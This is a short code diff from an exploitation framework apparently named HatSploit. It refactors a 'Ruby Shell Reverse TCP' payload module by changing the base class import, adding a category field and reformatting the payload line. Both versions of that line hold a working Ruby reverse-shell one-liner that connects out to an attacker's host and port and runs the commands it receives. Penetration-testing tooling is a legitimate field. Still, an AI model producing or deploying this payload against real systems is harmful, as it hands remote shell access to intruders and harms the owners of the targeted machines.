@@ -24,11 +24,13 @@
 # SOFTWARE.
 #
 
-from core.lib.payload import HatSploitPayload
+from core.lib.payload import Payload
 from utils.tcp.tcp import TCPClient
 
-class HatSploitPayload(HatSploitPayload, TCPClient):
+
+class HatSploitPayload(Payload, TCPClient):
     details = {
+        'Category': "single",
         'Name': "Ruby Shell Reverse TCP",
         'Payload': "multi/generic/ruby_reverse_tcp",
         'Authors': [
@@ -65,7 +67,7 @@ class HatSploitPayload(HatSploitPayload, TCPClient):
         local_host, local_port = self.parse_options(self.options)
 
         self.output_process("Generating payload...")
-        payload = "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\""+local_host+"\",\""+local_port+"\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
+        payload = "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"" + local_host + "\",\"" + local_port + "\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
 
         self.payload = payload
         self.instructions = payload
